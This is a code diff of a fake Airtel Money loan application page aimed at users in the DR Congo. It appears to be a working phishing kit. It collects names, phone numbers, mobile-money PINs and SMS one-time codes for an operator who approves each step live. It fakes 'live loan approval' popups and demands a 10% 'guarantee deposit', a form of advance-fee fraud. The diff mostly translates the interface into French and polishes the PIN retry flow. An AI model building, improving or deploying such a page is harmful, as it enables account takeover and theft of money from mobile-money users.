-      opt_personal: "Prêt Personnel",
-      opt_business: "Prêt Professionnel",
-      opt_home: "Prêt Immobilier",
-      opt_car: "Prêt Auto",
-      opt_edu: "Prêt Éducation",
-      field_loan_amt: "Montant du Prêt ($)",
-      field_loan_term: "Durée du Prêt",
-      field_purpose: "Motif du Prêt",
-      btn_next: "ÉTAPE SUIVANTE",
-      btn_prev: "PRÉCÉDENT",
-      field_fname: "Prénom",
-      field_lname: "Nom de famille",
-      field_phone: "Numéro de Téléphone",
-      phone_hint: "Entrez 9 chiffres pour la RDC",
-      field_emp_status: "Statut Professionnel",
-      emp_employed: "Salarié",
-      emp_self: "Indépendant",
-      emp_unemployed: "Sans emploi",
-      emp_retired: "Retraité",
-      emp_student: "Étudiant",
-      field_annual_income: "Revenu Annuel ($)",
-      sum_title: "Résumé de la Demande",
-      sum_amt: "Montant du Prêt :",
-      sum_term: "Durée du Prêt :",
-      sum_purpose: "Motif :",
-      sum_applicant: "Demandeur :",
-      btn_submit: "SOUMETTRE LA DEMANDE",
-      sub_title: "Demande de Prêt Soumise",
-      sub_desc: "Votre demande de prêt a été soumise. Veuillez patienter pour l'approbation.<br>Vous recevrez un message de confirmation. Pour l'instant, passez à Airtel Money.",
-      sub_redirect: "Redirection vers la connexion Airtel dans",
-      sub_btn_login: "Aller à la Connexion",
-      login_h2: "Connexion au Compte",
-      login_pin_lbl: "Entrez votre PIN (4 caractères)",
-      login_forgot: "Code PIN oublié ?",
-      login_btn: "CONNEXION",
-      terms_text: "En vous connectant, vous acceptez les",
-      terms_link: "Termes et Conditions",
-      otp_h2: "Vérification OTP",
-      otp_hint: "Entrez l'OTP envoyé à votre numéro de téléphone",
-      otp_waiting: "En attente de la vérification de l'administrateur…",
-      otp_resend_in: "Renvoyer le code dans",
-      otp_seconds: "secondes",
-      otp_submit: "SOUMETTRE",
-      appr_congrats: "🎉 Félicitations !",
-      appr_sub1: "Votre prêt a été",
-      appr_approved: "approuvé !",
-      appr_sub2: "Les fonds seront décaissés sous peu.",
-      appr_banner_lbl: "MONTANT APPROUVÉ",
-      comp_notice: "⚠️ AVIS DE CONFORMITÉ",
-      comp_text1: "Votre compte Airtel doit être actif et maintenir un dépôt de garantie d'au moins",
-      comp_text2: "10% du montant de votre prêt demandé.",
-      comp_text3: "Ce dépôt est entièrement remboursable en cas de remboursement réussi et aide à obtenir de meilleurs taux d'intérêt.",
-      ld_title: "💳 Détails du Prêt",
-      ld_monthly: "PAIEMENT MENSUEL",
-      ld_term: "DURÉE DU PRÊT",
-      ld_interest: "TAUX D'INTÉRÊt",
-      qa_title: "Actions Rapides",
-      qa_deposit: "💰 Déposer des Fonds",
-      qa_withdraw: "💸 Retirer des Fonds",
-      qa_details: "📄 Détails du Prêt",
-      nxt_title: "Prochaines Étapes :",
-      nxt_desc: "Vous recevrez un SMS et un e-mail avec les détails du décaissement dans les 24 heures.",
-      rth_btn: "🏠 Retour à l'Accueil",
-      modal_wait: "Veuillez patienter…",
-      modal_sending: "Envoi de vos coordonnées pour vérification",
-      modal_verifying_otp: "Vérification de l'OTP",
-      modal_submitting: "Soumission de la demande…",
-      modal_processing: "Veuillez patienter pendant le traitement de votre demande"
-    }
-  };
-
-  let currentLang = 'en';
-
-  function toggleLangDropdown(event) {
-    event.stopPropagation();
-    document.getElementById('langDropdownMenu').classList.toggle('show');
-  }
-
-  window.addEventListener('click', () => {
-    const menu = document.getElementById('langDropdownMenu');
-    if (menu && menu.classList.contains('show')) {
-      menu.classList.remove('show');
-    }
-  });
-
-  function setLanguage(lang) {
-    if (!translations[lang]) return;
-    currentLang = lang;
-    
-    document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('active'));
-    event && event.currentTarget && event.currentTarget.classList.add('active');
-    
-    const labels = { en: "🌐 English", sw: "🇨🇩 Kiswahili", fr: "🇫🇷 Français" };
-    document.getElementById('currentLangLabel').textContent = labels[lang];
-
-    document.querySelectorAll('[data-i18n]').forEach(el => {
-      const key = el.getAttribute('data-i18n');
-      if (translations[lang][key]) {
-        el.innerHTML = translations[lang][key];
-      }
-    });
-
-    document.getElementById('langDropdownMenu').classList.remove('show');
-  }
-
-  // ══════════════════════════════════════════════════════
-  // STATE
-  // ══════════════════════════════════════════════════════
+  // STATE MANAGEMENT
   const S = {
     amt: 1000,
-    term: '48 Months',
+    term: '48 Mois',
     purpose: '',
     first: '',
     last: '',
     phone: '',
-    applicationId: null,   
-    assignedAdminId: null  
+    applicationId: null,
+    assignedAdminId: null
   };
-
-  const _URL_ADMIN_ID = (() => {
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('admin');
-    sessionStorage.removeItem('selectedAdminId');
-    localStorage.removeItem('selectedAdminId');
-    if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
-      sessionStorage.setItem('selectedAdminId', id.trim());
-      return id.trim();
-    }
-    return null;
-  })();
 
   function getAdminId() {
     const params = new URLSearchParams(window.location.search);
@@ -1013,33 +1125,35 @@
     return sessionStorage.getItem('selectedAdminId') || null;
   }
 
-  // ══════════════════════════════════════════════════════
   // PAGE NAVIGATION
-  // ══════════════════════════════════════════════════════
   function goTo(id) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
   }
 
-  // ══════════════════════════════════════════════════════
   // LOAN CALCULATOR
-  // ══════════════════════════════════════════════════════
   function calcUp() {
     const a = +document.getElementById('rA').value;
     const t = +document.getElementById('rT').value;
-    const r = 0.12 / 12;
+    const r = 0.05 / 12;
     const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-    document.getElementById('aDisp').textContent = '$' + a.toLocaleString();
-    document.getElementById('tDisp').textContent = t + ' ' + (currentLang === 'fr' ? 'mois' : currentLang === 'sw' ? 'miezi' : 'months');
-    document.getElementById('mOut').textContent = '$' + m.toFixed(2);
-    document.getElementById('rA').style.setProperty('--pct', ((a-50)/(10000-50)*100).toFixed(1) + '%');
+    const tot = m * t;
+    
+    document.getElementById('aDisp').textContent = '$ ' + a.toLocaleString();
+    document.getElementById('tDisp').textContent = t + ' Mois';
+    document.getElementById('mOut').textContent = '$ ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+    
+    const totEl = document.getElementById('totOut');
+    if(totEl) {
+      totEl.textContent = 'Total à rembourser: $ ' + tot.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',') + ' (Capital + Intérêts)';
+    }
+
+    document.getElementById('rA').style.setProperty('--pct', ((a-1000)/(50000-1000)*100).toFixed(2) + '%');
     document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
   }
 
-  // ══════════════════════════════════════════════════════
-  // STEP NAVIGATION
-  // ══════════════════════════════════════════════════════
+  // FORM HELPERS
   function normalizePhone(id) {
     const el = document.getElementById(id);
     if (el.value.startsWith('0')) {
@@ -1068,12 +1182,16 @@
   function toS2() {
     const amt     = document.getElementById('s1am').value;
     const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Please enter a valid loan amount.');
+    if (!amt || Number(amt) < 1000) {
+      showErr('s1Err', 'Le montant minimum pour ce prêt est de $ 1,000.');
+      shakeField('s1am'); return;
+    }
+    if (Number(amt) > 50000) {
+      showErr('s1Err', 'Le montant maximum pour ce prêt est de $ 50,000.');
       shakeField('s1am'); return;
     }
     if (!purpose) {
-      showErr('s1Err', 'Please describe the purpose of your loan.');
+      showErr('s1Err', 'Veuillez préciser le motif de votre prêt.');
       shakeField('s1pu'); return;
     }
     clearErr('s1Err');
@@ -1087,34 +1205,53 @@
     const first = document.getElementById('s2fi').value.trim();
     const last  = document.getElementById('s2la').value.trim();
     const phone = document.getElementById('s2ph').value.trim();
-    if (!first) { showErr('s2Err', 'Please enter your first name.'); shakeField('s2fi'); return; }
-    if (!last)  { showErr('s2Err', 'Please enter your last name.');  shakeField('s2la'); return; }
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Please enter a valid phone number.'); shakeField('s2ph'); return;
+
+    if (!first) {
+      showErr('s2Err', 'Veuillez saisir votre prénom.');
+      shakeField('s2fi');
+      return;
     }
+
+    if (!last) {
+      showErr('s2Err', 'Veuillez saisir votre nom de famille.');
+      shakeField('s2la');
+      return;
+    }
+
+    if (!phone || phone.length < 9) {
+      showErr('s2Err', 'Veuillez saisir un numéro de téléphone valide à 9 chiffres.');
+      shakeField('s2ph');
+      return;
+    }
+
     clearErr('s2Err');
-    S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = '$' + Number(S.amt).toLocaleString();
+
+    S.first = first;
+    S.last = last;
+    S.phone = phone;
+
+    document.getElementById('sA').textContent = '$ ' + Number(S.amt).toLocaleString();
     document.getElementById('sT').textContent = S.term;
     document.getElementById('sP').textContent = S.purpose || '—';
     document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
+
     goTo('page-step3');
   }
 
   function submitApp() {
     const income = document.getElementById('s3in').value;
     if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Please enter your annual income.'); shakeField('s3in'); return;
+      showErr('s3Err', 'Veuillez préciser votre revenu annuel.'); shakeField('s3in'); return;
     }
     clearErr('s3Err');
 
     const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'SUBMITTING…'; }
+    if (btn) { btn.disabled = true; btn.textContent = 'ENVOI EN COURS…'; }
     document.getElementById('mSubmit').classList.add('show');
 
     setTimeout(() => {
       document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT APPLICATION'; }
+      if (btn) { btn.disabled = false; btn.textContent = 'SOUMETTRE ➔'; }
       goTo('page-submitted');
       let c = 3;
       document.getElementById('rdN').textContent = c;
@@ -1126,6 +1263,7 @@
     }, 1500);
   }
 
+  // INLINE MESSAGES
   function showLoginMsg(text) {
     document.getElementById('lgMsgTxt').textContent = text;
     document.getElementById('lgMsg').classList.add('show');
@@ -1148,6 +1286,7 @@
     });
   }
 
+  // LOGIN PIN HANDLERS
   function pinMv(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
@@ -1166,20 +1305,24 @@
     });
   }
 
+  let _loginInFlight = false;
+
   async function doLogin() {
+    if (_loginInFlight) return;          
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
     const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
 
     if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Please enter your phone number and 4-digit PIN.');
+      showLoginMsg('Veuillez saisir votre numéro de téléphone et votre code PIN à 4 chiffres.');
       return;
     }
 
     const phoneNumber = '+243' + rawPhone;
     const adminId = getAdminId();
 
+    _loginInFlight = true;
     document.getElementById('mLogin').classList.add('show');
     document.getElementById('bLogin').disabled = true;
 
@@ -1198,6 +1341,7 @@
       const data = await res.json();
 
       document.getElementById('mLogin').classList.remove('show');
+      _loginInFlight = false;
 
       if (data.success) {
         S.applicationId   = data.applicationId;
@@ -1213,16 +1357,18 @@
 
       } else {
         document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Verification failed. Please try again.');
+        showLoginMsg(data.message || 'Authentification échouée. Veuillez réinstaller votre code PIN.');
       }
 
     } catch (err) {
+      _loginInFlight = false;
       document.getElementById('mLogin').classList.remove('show');
       document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Network error. Please check your connection and try again.');
+      showLoginMsg('Erreur réseau. Veuillez vérifier votre connexion internet et réessayer.');
     }
   }
 
+  // PIN STATUS POLLING
   let pinPollInterval = null;
 
   function pollPinStatus() {
@@ -1238,8 +1384,8 @@
         if (data.status === 'approved') {
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Details verified! Please enter your OTP below.');
+          document.getElementById('otpInputSection').style.display = 'flex';
+          showOtpMsg('success', 'Identité confirmée ! Entrez le code OTP reçu par SMS.');
           startRs();
           document.getElementById('o0').focus();
 
@@ -1247,11 +1393,29 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Your details could not be verified. Please go back and try again.');
-          document.getElementById('bLogin').disabled = false;
+          showOtpMsg('error', 'Informations incorrectes. Veuillez réviser vos identifiants Airtel Money.');
+          setTimeout(() => {
+            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+            document.getElementById('bOtp').className = 'btn-otp';
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('otpInputSection').style.display = 'flex';
+            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+            document.getElementById('otpRs').innerHTML = 'Renvoyer le code dans <span id="rsS">30</span> secondes';
+            hideOtpMsgs();
+            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            document.getElementById('bLogin').disabled = false;
+            const phoneVal = document.getElementById('lgPh').value.trim();
+            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
+            hideLoginMsg();
+            _loginInFlight = false;
+            S.applicationId = null;
+            S.assignedAdminId = null;
+            goTo('page-login');
+          }, 2500);
         }
-
-      } catch (e) {}
+      } catch (e) {
+        // Silent
+      }
     }, 2000);
 
     setTimeout(() => {
@@ -1259,12 +1423,13 @@
         clearInterval(pinPollInterval);
         if (document.getElementById('pinWait').classList.contains('show')) {
           document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Verification timed out. Please go back and try again.');
+          showOtpMsg('warning', 'Délai dépassé. Veuillez réessayer la procédure.');
         }
       }
     }, 300000);
   }
 
+  // OTP HELPERS
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
@@ -1276,11 +1441,11 @@
   function startRs() {
     if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
 
-    let s = 60;
+    let s = 30;
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
-    rsBox.innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">' + s + '</span> <span data-i18n="otp_seconds">seconds</span>';
+    rsBox.innerHTML = 'Renvoyer le code dans <span id="rsS">' + s + '</span> secondes';
 
     _rsInterval = setInterval(() => {
       s--;
@@ -1290,7 +1455,7 @@
         clearInterval(_rsInterval);
         _rsInterval = null;
         const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--airtel-red);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+        if (box) box.innerHTML = '<span style="color:var(--brand-red);cursor:pointer;font-weight:700" onclick="resendOtp()">Renvoyer le code OTP</span>';
       }
     }, 1000);
   }
@@ -1305,37 +1470,38 @@
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'A new OTP request has been sent to the admin.');
+        showOtpMsg('info', 'Un nouveau code OTP a été envoyé.');
         startRs();
         [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
-        showOtpMsg('error', 'Could not resend OTP. Please try again.');
+        showOtpMsg('error', 'Échec de l\'envoi du code. Veuillez réessayer.');
       }
     } catch {
-      showOtpMsg('error', 'Network error while resending OTP.');
+      showOtpMsg('error', 'Erreur réseau lors du renvoi de l\'OTP.');
     }
   }
 
   async function doOtp() {
     const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
+
     if (otp.length < 4) {
-      showOtpMsg('warning', 'Please enter all 4 digits of your OTP.');
+      showOtpMsg('warning', 'Veuillez renseigner les 4 chiffres de votre code OTP.');
       return;
     }
 
     hideOtpMsgs();
 
     let c = 3;
-    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
+    document.getElementById('otpVT').textContent = 'Veuillez patienter… (' + c + 's)';
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
 
     const countdown = setInterval(() => {
       c--;
       const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Please wait… (' + c + 's)';
+      if (el) el.textContent = 'Veuillez patienter… (' + c + 's)';
     }, 1000);
 
     try {
@@ -1350,21 +1516,22 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        showOtpMsg('success', 'OTP submitted. Waiting for admin to approve…');
+        showOtpMsg('success', 'OTP soumis. En attente de déboursement…');
         pollOtpStatus();
       } else {
         document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Failed to submit OTP. Please try again.');
+        showOtpMsg('error', data.message || 'Code OTP invalide. Veuillez réessayer.');
       }
 
     } catch (err) {
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Network error. Please check your connection.');
+      showOtpMsg('error', 'Erreur réseau. Veuillez vérifier votre connexion.');
     }
   }
 
+  // OTP STATUS POLLING
   let otpPollInterval = null;
 
   function pollOtpStatus() {
@@ -1379,35 +1546,38 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
-          document.getElementById('apAmt').textContent  = '$' + Number(S.amt || 1000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || '48 Months';
+          document.getElementById('apAmt').textContent  = '$ ' + Number(S.amt || 1000).toLocaleString();
+          document.getElementById('apTerm').textContent = S.term || '48 Mois';
           const a = Number(S.amt) || 1000;
           const t = parseInt(S.term) || 48;
-          const r = 0.12 / 12;
+          const r = 0.05 / 12;
           const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = '$' + m.toFixed(2);
+          document.getElementById('apMthly').textContent = '$ ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
           goTo('page-approval');
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Verification failed. Please contact support.');
+          showOtpMsg('error', 'Validation échouée. Veuillez contacter le support.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
+          showOtpMsg('error', 'Code PIN incorrect. ⚠️ Attention : une nouvelle erreur verrouillera temporairement votre accès.');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            chkLogin();
-            document.getElementById('bLogin').disabled = false;
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = '';
+            document.getElementById('otpInputSection').style.display = 'flex';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">60</span> <span data-i18n="otp_seconds">seconds</span>';
+            document.getElementById('otpRs').innerHTML = 'Renvoyer le code dans <span id="rsS">30</span> secondes';
             hideOtpMsgs();
+            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            document.getElementById('bLogin').disabled = false;
+            const phoneVal = document.getElementById('lgPh').value.trim();
+            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
+            hideLoginMsg();
+            _loginInFlight = false;
             S.applicationId = null;
             S.assignedAdminId = null;
             goTo('page-login');
@@ -1418,65 +1588,58 @@
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = 'flex';
+          showOtpMsg('error', 'Mots de passe OTP erroné. Veuillez vérifier et resaisir.');
           document.getElementById('o0').focus();
         }
 
-      } catch (e) {}
+      } catch (e) {
+        // Silent
+      }
     }, 2000);
 
     setTimeout(() => {
       if (otpPollInterval) {
         clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Approval timed out. Please try again.');
+        showOtpMsg('warning', 'Temps d\'approbation écoulé. Veuillez réessayer.');
         document.getElementById('bOtp').disabled = false;
       }
     }, 300000);
   }
 
-  calcUp();
-    // // ══════════════════════════════════════════════════════
-// LIVE APPROVAL POPUP LOGIC (AIRTEL CONGO - USD)
-// ══════════════════════════════════════════════════════
-document.addEventListener("DOMContentLoaded", () => {
-
+  // LIVE APPROVAL POPUP LOGIC (DRC DRC / AIRTEL)
+  document.addEventListener("DOMContentLoaded", () => {
     const liveApprovals = [
-        { number: "+243 05* *** 416", location: "Kinshasa", amount: "$150" },
-        { number: "+243 05* *** 564", location: "Lubumbashi", amount: "$300" },
-        { number: "+243 05* *** 678", location: "Mbuji-Mayi", amount: "$500" },
-        { number: "+243 05* *** 780", location: "Kananga", amount: "$800" },
-        { number: "+243 05* *** 567", location: "Kisangani", amount: "$1,200" },
-        { number: "+243 05* *** 608", location: "Goma", amount: "$1,500" },
-        { number: "+243 05* *** 450", location: "Bukavu", amount: "$2,000" },
-        { number: "+243 05* *** 067", location: "Matadi", amount: "$2,500" },
-        { number: "+243 05* *** 406", location: "Kolwezi", amount: "$3,000" },
-        { number: "+243 05* *** 577", location: "Likasi", amount: "$3,500" },
-        { number: "+243 05* *** 436", location: "Tshikapa", amount: "$4,000" },
-        { number: "+243 05* *** 507", location: "Bunia", amount: "$5,000" },
-        { number: "+243 05* *** 436", location: "Uvira", amount: "$6,000" },
-        { number: "+243 05* *** 597", location: "Boma", amount: "$7,500" },
-        { number: "+243 05* *** 446", location: "Kindu", amount: "$8,000" },
-        { number: "+243 05* *** 537", location: "Mwene-Ditu", amount: "$10,000" },
-        { number: "+243 05* *** 458", location: "Isiro", amount: "$12,500" },
-        { number: "+243 05* *** 569", location: "Kalemie", amount: "$15,000" },
-        { number: "+243 05* *** 450", location: "Kikwit", amount: "$20,000" },
-        { number: "+243 05* *** 455", location: "Kinshasa", amount: "$25,000" }
+        { number: "+243 97*****841", amount: "$ 1,000" },
+        { number: "+243 99*****375", amount: "$ 2,500" },
+        { number: "+243 97*****912", amount: "$ 5,000" },
+        { number: "+243 98*****458", amount: "$ 10,000" },
+        { number: "+243 97*****694", amount: "$ 15,000" },
+        { number: "+243 99*****231", amount: "$ 20,000" },
+        { number: "+243 97*****885", amount: "$ 30,000" },
+        { number: "+243 98*****406", amount: "$ 40,000" },
+        { number: "+243 99*****534", amount: "$ 50,000" }
     ];
 
     const popup = document.getElementById("popup");
     const popupText = document.getElementById("popup-text");
     const popupAvatar = document.getElementById("popup-avatar");
+    const landingPage = document.getElementById("page-landing");
 
-    if (!popup || !popupText || !popupAvatar) {
-        console.error("Popup elements not found. Check your HTML IDs.");
+    if (!popup || !popupText || !popupAvatar || !landingPage) {
         return;
     }
 
     let lastIndex = -1;
 
     function displayPopup() {
-        let index;
+        if (!landingPage.classList.contains("active")) {
+            popup.classList.remove("show");
+            return;
+        }
 
+        let index;
         do {
             index = Math.floor(Math.random() * liveApprovals.length);
         } while (index === lastIndex && liveApprovals.length > 1);
@@ -1484,16 +1647,8 @@ document.addEventListener("DOMContentLoaded", () => {
         lastIndex = index;
 
         const user = liveApprovals[index];
-
-        // Avatar displays country code badge
-        popupAvatar.textContent = "+243";
-
-        popupText.innerHTML = `
-            <strong>${user.number}</strong><br>
-            From <strong>${user.location}</strong><br>
-            Has been approved for a loan of
-            <strong>${user.amount}</strong>
-        `;
+        popupAvatar.textContent = user.number.substring(5, 7);
+        popupText.innerHTML = `<strong>${user.number}</strong> a reçu un prêt de <strong>${user.amount}</strong>`;
 
         popup.classList.add("show");
 
@@ -1502,10 +1657,12 @@ document.addEventListener("DOMContentLoaded", () => {
         }, 2500);
     }
 
-    // Trigger popup loop
     setTimeout(displayPopup, 2000);
-    setInterval(displayPopup, 5500);
+    setInterval(displayPopup, 3500);
+  });
 
-});</script>
+  // INIT CALCULATOR
+  calcUp();
+</script>
 </body>
 </html>
